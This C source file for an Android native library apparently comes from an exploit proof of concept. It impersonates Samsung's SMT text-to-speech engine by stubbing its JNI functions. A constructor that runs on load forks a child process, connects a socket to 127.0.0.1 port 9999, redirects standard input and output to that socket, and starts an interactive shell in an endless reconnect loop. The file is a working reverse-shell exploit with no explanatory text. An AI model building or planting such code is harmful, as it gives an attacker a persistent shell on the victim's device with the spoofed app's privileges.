#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <jni.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <android/log.h>

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, "mercury-native", __VA_ARGS__)

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 9999

JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize(JNIEnv* env, jobject thiz) {
    return -1;
}

JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_setLanguage(
        JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
    return 1;
}

JNIEXPORT jint Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(
        JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
    return -1;
}

static void reverse_shell() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    while (connect(s, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        LOGE("connect() error: %s", strerror(errno));
        sleep(1); // keep trying to connect
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    system("/system/bin/sh -i");
}

__attribute__((constructor)) static void on_load() {
    int pid;
    LOGE("on_load() called, my uid is %d", getuid());
    pid = fork();
    if (pid == 0) {
        // child
        LOGE("starting reverse shell");
        while (1) {
            // start the shell again, so the client can reconnect after exiting
            reverse_shell();
            sleep(1);
        }
    }
}
